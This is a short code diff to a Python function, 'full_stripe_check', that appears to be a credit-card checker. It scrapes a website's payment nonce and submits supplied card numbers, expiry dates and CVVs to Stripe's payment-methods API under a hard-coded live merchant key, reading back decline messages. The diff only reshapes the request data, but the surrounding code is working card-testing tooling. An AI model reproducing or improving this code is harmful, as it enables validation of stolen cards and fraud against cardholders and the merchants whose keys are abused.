@@ -42,10 +42,14 @@ def full_stripe_check(cc, mm, yy, cvv):
         ajax_nonce = payment_nonce_match.group(1)
 
         # Step 5: Get Stripe payment token
-        stripe_data = (
-            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
-            '&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
-        )
+        stripe_data = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_year]': yy,
+            'card[exp_month]': mm,
+            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
+        }
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         if stripe_response.status_code == 402:
             error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
